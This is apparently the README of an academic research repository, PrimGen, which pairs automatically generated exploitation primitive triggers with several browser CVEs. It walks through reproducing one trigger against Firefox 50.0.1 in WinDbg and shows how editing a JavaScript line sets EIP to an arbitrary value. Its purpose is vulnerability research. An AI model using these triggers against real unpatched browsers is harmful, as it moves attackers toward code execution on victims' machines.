# PrimGen

In many cases, the given input which triggers a vulnerability and crashes a process 
does not enter an exploitable state. In our paper we discuss on what we can automate 
in a scalable fashion. How challenging can it be than tackling the problem for browsers? 

This repository contains data we presented in our paper:

https://www.syssec.ruhr-uni-bochum.de/research/publications/TABE/

Code will follow :)

# Structure

```
  |=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=|
  |     CVE      | binary name | version info   |
  |=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=|
  |CVE-2014-0322 | mshtml.dll  | 10.0.9200.16384| 
  |CVE-2014-1513 | mozjs.dll   | 27.0           |
  |CVE-2016-1960 | xul.dll     | 44.0.2.5884    |    
  |CVE-2016-2819 | xul.dll     | 46.0.1.5966    |    
  |CVE-2016-9079 | xul.dll     | 50.0.1.6171    |    
  |CVE-2014-3176 | chrome      | 35.0.1916.153  | 
  |=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=|
```

Each CVE folder contains the vulnerable dll file and *EPTs (Exploitation Primitive Trigger)* (see paper) which drives the execution into desired sinks.

The start/end parts of the automatically generated code are marked as follows:

```
//--- GENERATED PART START ---
.... generated js code .... 
//--- GENERATED PART END ---
```

# Example 

== Verifying EPTs for CVE-2016-9079 ==

== Tested on Windows 10 (x64) in VirtualBox ==
== Target: Mozilla Firefox 50.0.1 32-bit ==

Test with EPT:

&nbsp; &nbsp; *suc_poc_xul_0.html* 
>found in *results/CVE-2016-9079/suc_poc_xul_0.html*

This should drive the exeuction into an *indirect call* which we control.


#### 1) Install target
```
    https://ftp.mozilla.org/pub/firefox/releases/50.0 1/win32/en-US/Firefox%20Setup%2050.0.1.exe
```
#### 2) Install WinDBG
```
    https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/
```

- NOTE: use the *"As a standalone tool set"* method. This saves time and space.

#### 3) Open the target in WinDBG:
- Start WinDbg (X64) (just type windbg in the windows 10 search bar, and
WinDbg (X64) should appear)
- In WinDbg: 
```
   File -> Open Executable -> Choose firefox.exe in the folder
   where it was installed
```
- NOTE: check also the line *"Debug child processes also"*
- Click the *"Open"* button
- Press F5 until Firefox appears (during execution if you see *"int 3"* or
*"ret"* in the debugger press F5)

#### 4) Serve the EPTs via python's build in server (or choose a method of your liking):

```
   cd into "results/CVE-2016-9079"
   start the server: 
      $ python -m SimpleHTTPServer 8080
```

#### 5) Check an EPT in target:
- Browse to your server address and open *suc_poc_xul_0.html* (for example)

- The browser should freeze (and crash) and you should see a similar
output like the following in the debugger window:

```
(634.6e0): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
*** ERROR: Symbol file could not be found.  Defaulted to export symbols
for C:\Program Files (x86)\Mozilla_Firefox_x86_50.0.1\xul.dll -
30300220 0000            add     byte ptr [eax],al
ds:002b:30302f74=00
```

&#10233; EIP gets set to **0x30300220** and the data at that address is interpreted 
as code (crash due to DEP violation).
The **GENERATED PART** in the html file sets the memory such that a path is executed until EIP (the wanted *exploitation primitive*) is set.

Note the last line in GENERATED PART of *suc_poc_xul_0.html*:

```javascript
heap_block[offset/4 + 0x30ac/4] = object_target_address +0x220; 
// 0x20acL -> 0x30acL (0x138L)
```

is the value which sets EIP.

In the html file you can see that
```javascript
object_target_address = 0x30300000
```

> object_target_address + 0x220 = 0x30300220

We successfully drive the execution into this primitive with an address
of our choice. In this case we set it back into an object field.

You can change the line (54) to

```javascript
heap_block[offset/4 + 0x30ac/4] = 0x41414141
```
to get the value 0x41414141 into EIP.

Then the debugger should crash with EIP set to 0x41414141.